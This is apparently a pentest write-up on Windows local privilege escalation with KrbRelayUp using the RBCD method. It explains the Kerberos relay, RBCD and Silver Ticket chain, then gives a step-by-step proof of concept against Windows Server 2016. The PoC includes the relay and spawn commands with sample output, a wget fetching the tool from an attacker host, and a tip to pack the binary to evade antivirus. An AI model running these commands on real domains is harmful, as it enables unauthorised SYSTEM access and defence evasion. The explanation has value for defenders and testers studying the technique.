Privilege Escalation - KrbRelayUp (RBCD method)
=======================================================================================================================

KrbRelayUp is a wrapper around some of the features of Rubeus and KrbRelay (and a few other tools) in order to streamline the abuse of the following
attack primitive:
1. New machine account creation (New-MachineAccount)
2. Local machine account authentication coercion (using KrbRelay)
3. Kerberos relay to LDAP (using KrbRelay)
4. Add Resource-based constrained (RBCD) privileges and obtain a privileged Silver Ticket (ST) to local machine (using Rubeus)
5. Using said Silver Ticket (ST) to authenticate to local Service Manager and create a new service as NT/SYSTEM (using SCMUACBypass)

This is essentially a universal no-fix local privilege escalation in windows domain environments where LDAP signing is not enforced (the default settings).

Explanations
-------------
> Kerberos Relay Attack adds a fake (or owned) computer account to the target's msDS-AllowedToActOnBehalfOfOtherIdentity attribute, making it possible 
  to perform a Resource-Based Constrained Delegation Attack against the target. The result of the RBCD attack is Silver Ticket access to the target, 
  which can be used for local admin access remotely or even locally (meaning privilege escalation) by patching the Win32 Service Control Manager to use
  Kerberos Authentication locally.

Reminder about RBCD and Silver ticket attacks
---------------------------------------------
> Machine accounts can edit their own msDS-AllowedToActOnBehalfOfOtherIdentity attribute, hence allowing RBCD attacks on relayed machine accounts authentications.
  For this attack to work, the attacker needs to populate the target attribute with an account having a ServicePrincipalName set (needed for Kerberos delegation operations).
  The usual way to conduct these attacks is to create a computer account, which comes with an SPN set. 
  This is usually possible thanks to a domain-level attribute called MachineAccountQuota that allows regular users to create up to 10 computer accounts. 
  While this "computer account creation + RBCD attack" is the most common exploitation path, doing so with a user account (having at least one SPN) is perfectly
  feasible.
  Then, in order to abuse this, the attacker has to control the account the object's attribute has been populated with (i.e. the account that has an SPN). 
  Using that account's credentials, the attacker can obtain a ticket through S4U2Self and S4U2Proxy requests, just like constrained delegation with protocol transition.
  In the end, an RBCD abuse results in a Service Ticket to authenticate on a target service on behalf of a user. 
  Once the final Service Ticket is obtained, it can be used with Pass-the-Ticket to access the target service. 
> A Silver ticket attack is based on crafting a valid TGS for a service once the NTLM hash of the service is owned (like the PC account hash).

PoC 1 - Local privilege escalation on a Windows Server 2016 (fully patched) using the tool KrbRelayUP and the RBDCD method 
==================================================================================================================================

Step 1 - We are logged on a Windows server 2016 with a low privileged user (only member of the "Remote Desktop Users" group)

Step 2 - Upload the tool KrbRelayUp.exe on the target Windows server 2016
-------------------------------------------------------------------------------------

Note: you need to 'pack' the tool to avoid AV detection.

PS C:\temp> wget -Uri http://192.168.1.30:8080/KrbRelayUP.exe -OutFile KrbRelayUP.exe


Step 3 - Perform the KrbRelayUp attack in 2 phases: 'Relay' and 'Spawn'
--------------------------------------------------------------------------------------

Attack phase 1 'RELAY'
-----------------------
=> KrbRelayUP will Coerce a Kerberos authentication from the local machine account, relay it to LDAP (AD) and create a control primitive over the local machine
   using a RBCD.

C:\temp>KrbRelayUP.exe relay -Domain company.work -CreateNewComputerAccount -ComputerName Pentesterhost$ -ComputerPassword Welcome2022

KrbRelayUp - Relaying you to SYSTEM

[+] Rewriting function table
[+] Rewriting PEB
[+] Init COM server
[+] Computer account "Pentesterhost$" added with password "Welcome2022"
[+] Register COM server
[+] Forcing SYSTEM authentication
[+] Got Krb Auth from NT/SYSTEM. Relying to LDAP now...
[+] LDAP session established
[+] RBCD rights added successfully
[+] Run the spawn method for SYSTEM shell:
    ./KrbRelayUp.exe spawn -m rbcd -d company.work -dc DC1.company.work -cn Pentesterhost$ -cp Welcome2022


Attack phase 2 'SPAWN'
-----------------------
=> KrbRelayUP will will use the appropriate control primitive to obtain a Kerberos Service Ticket and will use it to create a new service running as SYSTEM.

C:\temp>KrbRelayUp.exe spawn -m rbcd -d company.work -dc DC1.company.work -cn Pentesterhost$ -cp Welcome2022
